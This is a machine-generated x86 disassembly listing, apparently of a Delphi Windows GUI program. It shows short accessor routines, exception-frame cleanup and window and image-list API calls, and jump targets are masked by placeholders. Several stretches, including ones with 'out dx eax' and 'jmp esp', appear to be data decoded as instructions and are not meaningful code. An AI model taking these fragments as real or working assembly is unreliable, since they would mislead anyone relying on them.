call sub_43b4f4
sub_440c68
cmp dl [ eax + 0x1a5 ]
je r-xdata
retn
mov [ eax + 0x1a5 ] dl
mov [ eax + 0x1a9 ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb010
call sub_43b4f4
sub_440c8c
mov al [ eax + 0x1a9 ]
xor al 0x1
retn
sub_440c98
cmp dl [ eax + 0x1a9 ]
je r-xdata
retn
mov [ eax + 0x1a9 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb011
call sub_43b4f4
sub_440d44
test [ eax + 0x54 ] 0x8
je r-xdata
call sub_440ce8
retn
movsx edx dx
mov [ eax + 0x1a0 ] edx
retn
sub_440e20
jmp sub_403858
sub_440e27
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_441046
jmp sub_403858
sub_44104d
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_441154
call sub_43b2c4
retn
sub_4415a2
jmp sub_403858
sub_441638
mov eax [ r-xdata ]
retn
sub_44179f
jmp sub_403858
sub_441b32
jmp sub_403858
sub_441c74
test [ eax + 0x52 ] 0x4
setne al
retn
sub_441dd0
jmp sub_403858
sub_441dd7
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_41da34
retn
sub_441df3
jmp sub_403858
sub_441e00
retn
sub_441ed4
mov [ edx + 0xc ] 0xffffffff
retn
sub_441f32
jmp sub_403858
sub_441f39
pop ecx
pop ecx
pop ebp
retn
sub_441fd9
jmp sub_403858
sub_441fe0
pop ebx
mov esp ebp
pop ebp
retn
sub_44204c
call sub_43e080
retn
sub_4420df
jmp sub_403858
sub_4420e6
pop esi
pop ecx
pop ecx
pop ebp
retn
sub_4422c5
jmp sub_403858
sub_4422cc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_442428
push ebx
mov ebx eax
mov eax ebx
call sub_4473d4
or edx 0xffffffff
mov eax ebx
call sub_442554
pop ebx
retn
sub_442500
jmp sub_403858
sub_442554
cmp dx [ eax + 0x68 ]
je r-xdata
retn
mov [ eax + 0x68 ] dx
cmp [ eax + 0x6a ] 0x0
je r-xdata
call sub_442440
sub_4426c4
push ebx
mov ebx eax
mov eax ebx
call sub_44748c
test al al
je r-xdata
pop ebx
retn
push 0xffffffff
call ImageList_DragShowNolock
sub_4426dc
push ebx
mov ebx eax
mov eax ebx
call sub_44748c
test al al
je r-xdata
pop ebx
retn
push 0x0
call ImageList_DragShowNolock
sub_4427c8
push ebx
push esi
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x100
mov edx esi
mov eax ebx
call sub_43ecb8
and [ ebx + 0x54 ] 0xfeff
pop esi
pop ebx
retn
sub_442863
jmp sub_403858
sub_44286a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44288d
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_41da34
retn
sub_442886
jmp sub_403858
sub_44288d
pop ebx
pop ecx
pop ebp
retn
sub_442894
retn
sub_4428fc
xor edx edx
mov eax [ eax + 0x8 ]
test eax eax
je r-xdata
mov eax edx
retn
mov eax [ eax + 0xc ]
inc edx
test eax eax
jne r-xdata
sub_442c69
jmp sub_403858
sub_442e50
mov eax [ eax + 0x8 ]
jmp r-xdata
mov edx [ eax + 0xc ]
test edx edx
jne r-xdata
mov eax edx
retn
sub_44303c
jmp sub_403858
sub_4430ec
mov eax [ eax + 0x14 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
add [ ecx + 0x4 ] 0xc
retn
add [ ecx ] 0xc
retn
sub_443100
inc [ eax + 0x6c ]
retn
sub_443104
dec [ eax + 0x6c ]
cmp [ eax + 0x6c ] 0x0
jg r-xdata
retn
xor edx edx
mov [ eax + 0x6c ] edx
call sub_444984
sub_443264
call sub_443964
test eax eax
je r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
retn
sub_443c0f
jmp sub_403858
sub_443c16
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443c33
lea eax [ ebp - 0xc ]
call sub_403e54
retn
sub_443c2c
jmp sub_403858
sub_443c33
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_443f14
jmp sub_403858
sub_443f1b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443f38
mov eax [ ebp - 0x4 ]
call sub_41da34
retn
sub_443f31
jmp sub_403858
sub_443f38
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443f55
mov eax [ ebp - 0x4 ]
call sub_403104
retn
sub_443f4e
jmp sub_403858
sub_443f55
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_444409
jmp sub_403858
sub_444410
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44459b
jmp sub_403858
sub_4445a2
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_444657
jmp sub_403858
sub_44465e
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44474c
jmp sub_403858
sub_44479d
jmp sub_403858
sub_4447a4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_444860
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_443170
mov [ ebx + 0x38 ] eax
pop esi
pop ebx
retn
sub_4449ac
cmp [ eax + 0x6c ] 0x0
jne r-xdata
retn
mov eax edx
call sub_442cac
sub_4452ac
jmp sub_403858
sub_4452b3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44537c
call GetCapture
retn
sub_445384
push ebx
mov ebx edx
push ebx
call GetCursorPos
call sub_40cbb8
pop ebx
retn
sub_445394
push ebx
mov ebx eax
push 0x13
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb eax eax
inc eax
mov [ ebx + 0xc ] al
pop ebx
retn
sub_4455fa
jmp sub_403858
sub_4457f4
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
retn
push eax
call [ rw-data ]
retn
sub_445a08
jmp sub_403858
sub_445a0f
pop ebx
mov esp ebp
pop ebp
retn
sub_445abb
jmp sub_403858
sub_445ac2
pop ebp
retn
sub_445b4a
jmp sub_403858
sub_445b51
pop ebp
retn
sub_445bfe
out dx eax
push edx
push ecx
[ ebx + 0x63d80044 ]
sub_44615a
out dx eax
jmp [ edi + ebp * 2 ]
sub_4462a0
mov edx [ eax + 0x5c ]
test edx edx
je r-xdata
or eax 0xffffffff
retn
mov edx [ edx + 0x30 ]
xchg edx eax
call sub_413dc8
retn
sub_4462b8
mov al 0x1
retn
sub_4462bc
mov edx [ eax + 0x5c ]
test edx edx
je r-xdata
call sub_419c84
retn
mov eax edx
retn
sub_4462cc
cmp [ eax + 0x5c ] 0x0
je r-xdata
call sub_419c54
retn
mov al 0x1
retn
sub_4465bc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_413d6c
pop esi
pop ebx
retn
sub_4465d0
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x8 ]
retn
sub_44660c
cmp edx [ eax + 0x38 ]
jne r-xdata
retn
mov edx [ eax ]
call [ edx + 0x30 ]
sub_446870
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403290
pop ebx
retn
sub_446884
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403290
pop ebx
retn
sub_446898
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403290
pop ebx
retn
sub_4468ac
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403290
pop ebx
retn
sub_4468c0
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403290
pop ebx
retn
sub_4468d4
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403290
pop ebx
retn
sub_4468e8
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403290
pop ebx
retn
sub_4468fc
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403290
pop ebx
retn
sub_446910
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403290
pop ebx
retn
sub_446924
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403290
pop ebx
retn
sub_446938
retn
sub_44693c
retn
sub_446940
retn
sub_446944
retn
sub_446948
retn
sub_44694c
retn
sub_446950
retn
sub_446954
retn
sub_446958
retn
sub_44695c
retn
sub_446960
retn
sub_446964
retn
sub_446c10
jmp sub_403858
sub_446fac
push ebx
mov ebx eax
cmp [ ebx + 0x90 ] 0x0
jne r-xdata
mov eax [ ebx + 0x90 ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov [ ebx + 0x90 ] eax
sub_446fd4
push esi
mov si 0xffef
call sub_403300
pop esi
retn
sub_447075
jmp sub_403858
sub_44707c
pop ebp
retn
sub_447080
sub [ rw-data ] 0x1
jae r-xdata
retn
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_4135f4
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_4135f4
sub_4472a8
mov edx eax
sub edx 0xff000000
je r-xdata
mov eax 0x20000000
sub edx 0xffffff
jne r-xdata
retn
mov eax 0x1fffffff
retn
sub_447481
jmp sub_403858
sub_447488
pop ebx
pop ecx
pop ebp
retn
sub_44748c
cmp [ eax + 0x3c ] 0x0
setne al
retn
sub_447494
cmp [ eax + 0x3c ] 0x0
jne r-xdata
retn
call sub_4476fc
sub_447541
jmp sub_403858
sub_447548
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x54 ]
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
call sub_403104
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x54 ] edx
sub_447650
test edx edx
je r-xdata
mov eax [ eax + 0x50 ]
mov edx [ eax ]
call [ edx + 0x64 ]
retn
mov eax edx
retn
sub_44778f
jmp sub_403858
sub_447796
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44782e
jmp sub_403858
sub_447835
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447852
mov eax [ ebp - 0xc ]
call sub_403104
retn
sub_44784b
jmp sub_403858
sub_447852
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403300
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_447929
jmp sub_403858
sub_447967
jmp sub_403858
sub_44796e
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403300
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_447b33
jmp sub_403858
sub_447b3a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447b57
mov eax [ ebp - 0xc ]
call sub_403104
retn
sub_447b50
jmp sub_403858
sub_447b57
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_447bd0
retn
sub_447b70
jmp sub_403858
sub_447bbf
jmp sub_403858
sub_447bc6
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_447c4f
jmp sub_403858
sub_447c56
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_447c5c
or edx 0xffffffff
call sub_447bd0
retn
sub_44806b
jmp sub_403858
sub_448072
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44808f
mov eax [ ebp - 0xc ]
call sub_403104
retn
sub_448088
jmp sub_403858
sub_44808f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4480ac
mov eax [ ebp - 0x4 ]
call sub_448ba4
retn
sub_4480a5
jmp sub_403858
sub_4480ac
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4482b0
jmp sub_403858
sub_4482b7
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4482bc
push esi
mov esi eax
cmp dl [ esi + 0x40 ]
je r-xdata
pop esi
retn
mov [ esi + 0x40 ] dl
mov eax esi
mov si 0xffef
call sub_403300
sub_4482d4
push ebx
mov ebx edx
mov ecx ebx
xor edx edx
xor eax eax
call sub_412910
pop ebx
retn
sub_448378
mov [ edx + 0x4 ] eax
mov ecx [ eax + 0x4c ]
test ecx ecx
je r-xdata
retn
mov eax ecx
call sub_413c10
sub_44848f
jmp sub_403858
sub_448496
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403104
retn
sub_4484ac
jmp sub_403858
sub_4487be
jmp sub_403858
sub_4487c5
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4487e2
mov eax [ ebp - 0x10 ]
call sub_403104
retn
sub_4487db
jmp sub_403858
sub_4487e2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4487ff
mov eax [ ebp - 0x8 ]
call sub_403104
retn
sub_4487f8
jmp sub_403858
sub_4487ff
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_448868
jmp sub_403858
sub_448981
jmp sub_403858
sub_44899e
jmp sub_403858
sub_448b56
jmp sub_403858
sub_448b5d
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_448ba0
inc [ eax + 0x5c ]
retn
sub_448ba4
push esi
cmp [ eax + 0x5c ] 0x0
jle r-xdata
cmp [ eax + 0x58 ] 0x0
je r-xdata
dec [ eax + 0x5c ]
pop esi
retn
mov [ eax + 0x58 ] 0x0
mov si 0xffef
call sub_403300
sub_448bf8
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx [ eax + 0x4 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_448c35
jmp sub_403858
sub_448c3c
pop ebp
retn
sub_448c40
sub [ rw-data ] 0x1
retn
sub_44908c
clc
push edx
push ecx
[ ebx + ecx * 8 + 0x44 ]
sub_449095
add [ ebp + eax * 8 + 0x44 ] ch
add [ esi + eax * 8 ] bh
inc esp
add [ esi + eax * 8 + 0x44 ] dh
add ah bl
0x44
sub_449b4b
jmp [ eax + eax ]
sub_449ba8
mov eax [ esp + 0x8 ]
retn
sub_449bb0
push ebx
mov ebx eax
call sub_449ba8
push eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b5dc
jmp sub_403890
sub_449bcc
pop ebx
retn
sub_449e45
jmp sub_403858
sub_449e4c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_449f97
jmp sub_403858
sub_449f9e
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_449fb4
push ebx
mov eax [ rw-data ]
call sub_414284
mov ebx eax
movzx edx bx
mov cl 0x1
mov eax [ rw-data ]
call sub_414240
mov eax ebx
pop ebx
retn
sub_44a13c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_44a158
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032b4
mov al [ eax + 0x95 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0xa8 ]
sete al
pop ebx
retn
sub_44a853
jmp sub_403858
sub_44a85a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44a952
jmp sub_403858
sub_44a959
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44ad7c
jmp sub_403858
sub_44ad83
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_44b22f
jmp sub_403858
sub_44b6d0
jmp sub_403858
sub_44b6d7
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44bb3b
jmp sub_403858
sub_44bff8
jmp sub_403858
sub_44bfff
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44c3aa
jmp sub_403858
sub_44c3b1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_44c3bf
inc [ ecx ]
add [ eax ] al
add [ 0xffffffffb0000000 ] ch
add ebx eax
nop
cmp dl [ eax + 0x48 ]
je r-xdata
retn
mov [ eax + 0x48 ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_44c56c
mov eax [ r-xdata ]
retn
sub_44c5a8
cmp dx [ eax + 0x60 ]
je r-xdata
retn
mov [ eax + 0x60 ] dx
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_44c5bc
cmp dl [ eax + 0x3e ]
je r-xdata
retn
mov [ eax + 0x3e ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_44c5cc
cmp edx [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] edx
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_44c5dc
or edx 0xffffffff
mov ecx [ eax + 0x64 ]
test ecx ecx
je r-xdata
mov eax edx
retn
mov edx eax
mov eax ecx
call sub_44c8d8
mov edx eax
sub_44c674
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
mov edx esi
call sub_44c5f4
pop esi
pop ebx
retn
sub_44c6f0
mov edx [ eax + 0x44 ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_44c8d8
push esi
or ecx 0xffffffff
mov esi [ eax + 0x5c ]
test esi esi
je r-xdata
mov eax ecx
pop esi
retn
mov eax esi
call sub_413dc8
mov ecx eax
sub_44cac8
mov edx [ eax + 0x64 ]
test edx edx
je r-xdata
mov eax edx
retn
cmp [ edx + 0x70 ] 0x0
je r-xdata
mov eax [ edx + 0x70 ]
retn
sub_44cb30
jmp r-xdata
mov edx [ eax + 0x64 ]
test edx edx
jne r-xdata
mov eax edx
mov eax [ eax + 0x70 ]
retn
sub_44ced8
cmp edx [ eax + 0x7c ]
jne r-xdata
retn
call sub_44cf0c
sub_44cf0c
mov edx sub_44cee4
mov ecx eax
mov eax [ eax + 0x68 ]
xchg edx eax
call sub_44a034
retn
sub_44d0f6
jmp sub_403858
sub_44d0fd
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44d594
jmp sub_403858
sub_44d5d3
jmp sub_403858
sub_44d5da
mov al [ ebp - 0x1a ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44d778
cmp dl [ eax + 0x3c ]
je r-xdata
retn
mov [ eax + 0x3c ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_44d8b4
push ebp
mov ebp esp
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ eax + 0x34 ]
mov si 0xfffd
call sub_403300
pop esi
pop ebp
retn 0x8
sub_44d8d0
mov eax [ eax + 0x34 ]
call sub_44ab08
retn
sub_44d8dc
push esi
mov esi eax
mov eax [ esi + 0x34 ]
mov si 0xfff9
call sub_403300
pop esi
retn
sub_44d918
push ebx
mov ecx sub_44d8f0
mov edx [ eax + 0x34 ]
mov ebx [ edx + 0x68 ]
mov eax edx
xchg ecx eax
mov edx ebx
call sub_44a034
pop ebx
retn
sub_44db4c
cmp [ eax + 0x40 ] 0x0
jne r-xdata
mov al 0x1
retn
cmp [ eax + 0x48 ] 0x0
jne r-xdata
xor eax eax
retn
sub_44db60
jmp r-xdata
test edx edx
jle r-xdata
retn
test eax eax
jne r-xdata
mov eax [ eax + 0x64 ]
dec edx
j_sub_4035a4
jmp sub_4035a4
sub_44dd97
jmp sub_403858
sub_44ddc2
jmp sub_403858
sub_44ddc9
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov al 0x1
cmp [ ebp - 0x14 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_44dde0
mov al [ eax + 0x41 ]
xor al 0x1
retn
sub_44dfc8
cmp dl [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] dl
call sub_44d918
sub_44e048
jmp sub_403858
sub_44e08c
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_44e0a4
push ebx
mov ebx eax
mov eax ebx
call sub_419ca4
xor ecx ecx
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop ebx
retn
sub_44e0f6
add [ eax ] al
cmp edx [ eax + 0x48 ]
jne r-xdata
retn
call sub_44d918
sub_44e16c
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_44e2b5
jmp sub_403858
sub_44e2bc
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_44e4fc
cmp dl [ eax + 0x41 ]
je r-xdata
retn
mov [ eax + 0x41 ] dl
call sub_44e50c
sub_44e560
mov eax [ eax + 0x34 ]
movzx eax [ eax + 0x3b ]
mov al [ eax + rw-data ]
retn
sub_44e570
and edx 0x7f
mov dl [ edx + rw-data ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x3b ] dl
retn
sub_44e580
mov eax [ eax + 0x34 ]
movzx eax [ eax + 0x3c ]
mov al [ eax + rw-data ]
retn
sub_44e590
and edx 0x7f
mov dl [ edx + rw-data ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x3c ] dl
retn
sub_44e5a0
cmp dl [ eax + 0x5c ]
je r-xdata
retn
mov [ eax + 0x5c ] dl
mov edx [ eax + 0x38 ]
test edx edx
je r-xdata
push 0x0
push 0x0
push 0xb015
push edx
call SendMessageA
sub_44e618
test edx edx
je r-xdata
xor edx edx
mov eax [ eax + 0x34 ]
call sub_44a960
retn
mov eax [ eax + 0x34 ]
mov edx [ edx + 0x34 ]
call sub_44a960
retn
sub_44e634
test edx edx
je r-xdata
retn
mov ecx [ eax + 0x34 ]
mov ecx [ ecx + 0x68 ]
cmp ecx [ edx + 0x34 ]
jne r-xdata
xor edx edx
mov eax [ eax + 0x34 ]
call sub_44a960
sub_44e67c
mov edx [ eax + 0x58 ]
test edx edx
je r-xdata
call sub_44d8d0
retn
mov eax edx
retn
sub_44e6b6
jmp sub_4035a4
sub_44e6bb
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_45a284
call sub_40390c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44ea21
jmp sub_403858
sub_44ea28
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
call sub_403104
retn
sub_44ea3e
jmp sub_403858
sub_44eb3f
jmp sub_403858
sub_44eb46
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44eb63
mov eax [ ebp - 0x14 ]
call sub_403104
retn
sub_44eb5c
jmp sub_403858
sub_44eb81
jmp sub_403858
sub_44ec0b
jmp sub_403858
sub_44ec12
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44ec44
push ebx
mov ebx eax
mov eax ebx
call sub_413eb0
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x10 ]
call sub_41aa54
sub_44ed08
push ebx
cmp [ eax + 0x72 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x74 ]
call [ ebx + 0x70 ]
sub_44ed1c
mov eax [ eax + 0x34 ]
mov eax [ eax + 0x54 ]
retn
sub_44ed24
mov eax [ eax + 0x34 ]
mov [ eax + 0x54 ] edx
retn
sub_44f0e9
jmp sub_403858
sub_44f0f0
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44f1f0
jmp sub_403858
sub_44f1f7
pop ebp
retn
sub_44fd6f
[ edi + edi * 8 - 0x2f002f ]
sub_44fd76
stc
jmp esp
sub_44feac
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
sub_4503bb
pop esp
retn
sub_451038
mov eax [ rw-data ]
retn
sub_451040
mov [ rw-data ] eax
retn
sub_451188
jmp sub_4035a4
sub_4511bf
jmp sub_403858
sub_4511c6
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4514ce
jmp sub_403858
sub_4514d5
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_451579
jmp sub_403858
sub_451580
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_451610
mov al [ eax + 0x1f ]
xor al 0x1
retn
sub_451d3c
cmp edx [ eax + 0x28 ]
je r-xdata
retn
mov [ eax + 0x28 ] edx
mov [ eax + 0x2c ] 0x0
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_4523e8
sub_451d58
cmp dl [ eax + 0x2c ]
je r-xdata
retn
mov [ eax + 0x2c ] dl
test dl dl
je r-xdata
mov edx 0xff000014
call sub_451d3c
sub_451e78
cmp dl [ eax + 0x34 ]
je r-xdata
retn
mov [ eax + 0x34 ] dl
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_4523e8
sub_451e90
cmp edx [ eax + 0x38 ]
je r-xdata
retn
mov [ eax + 0x38 ] edx
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_4523e8
sub_451ea8
mov ecx edx
mov [ eax + 0x10 ] ecx
test ecx ecx
jge r-xdata
mov eax [ eax + 0x4 ]
call sub_4523e8
retn
xor edx edx
mov [ eax + 0x10 ] edx
sub_451ed4
mov eax [ eax + 0x4 ]
mov al [ eax + 0x210 ]
xor al 0x1
retn
sub_451ee0
mov [ eax + 0x1c ] dl
mov eax [ eax + 0x4 ]
call sub_4523e8
retn
sub_4521c0
push ebx
mov ebx edx
mov edx ebx
call sub_43d9b4
and [ ebx + 0x24 ] 0xfffffffc
pop ebx
retn
sub_452230
cmp [ eax + 0x5c ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x1a8 ] 0x0
je r-xdata
mov al 0x1
retn
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
sub_452358
jmp sub_403858
sub_45235f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_452368
push ebx
mov ebx eax
cmp [ ebx + 0x214 ] 0x0
jg r-xdata
pop ebx
retn
mov eax [ ebx + 0x208 ]
call sub_451774
mov eax [ ebx + 0x20c ]
call sub_451774
sub_4523c8
push esi
mov esi eax
mov eax [ esi + 0x208 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_4523d8
push esi
mov esi eax
mov eax [ esi + 0x20c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_4524d3
jmp sub_403858
sub_4524e0
test edx edx
je r-xdata
retn
test [ edx + 0x1c ] 0x1
jne r-xdata
test [ eax + 0x1c ] 0x1
jne r-xdata
call sub_4524f8
sub_452714
retn
sub_452782
jmp sub_403858
sub_4527c1
jmp sub_403858
sub_4527f4
cmp [ edx + 0x8 ] 0x0
jne r-xdata
call sub_43eeac
retn
mov ecx [ eax + 0x208 ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ eax + 0x208 ]
call sub_451a00
retn
sub_452818
cmp [ edx + 0x8 ] 0x0
jne r-xdata
call sub_43eecc
retn
mov ecx [ eax + 0x20c ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ eax + 0x20c ]
call sub_451a00
retn
sub_45290d
jmp sub_403858
sub_452914
mov eax [ ebp - 0x4 ]
call sub_440e2c
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_451668
mov eax [ ebp - 0x4 ]
call sub_4523e8
sub_452a48
jmp sub_403858
sub_452a80
jmp sub_403858
sub_452a87
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_452aa7
lea eax [ ebp - 0x114 ]
call sub_403e54
retn
sub_452aa0
jmp sub_403858
sub_452aa7
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_452dae
jmp sub_403858
sub_452db5
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_403478
sub_452e09
jmp sub_4035a4
sub_452e85
jmp sub_4035a4
sub_452e8a
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_45a284
call sub_40390c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_453242
jmp sub_403858
sub_453249
pop esi
pop ebx
pop ecx
pop ebp
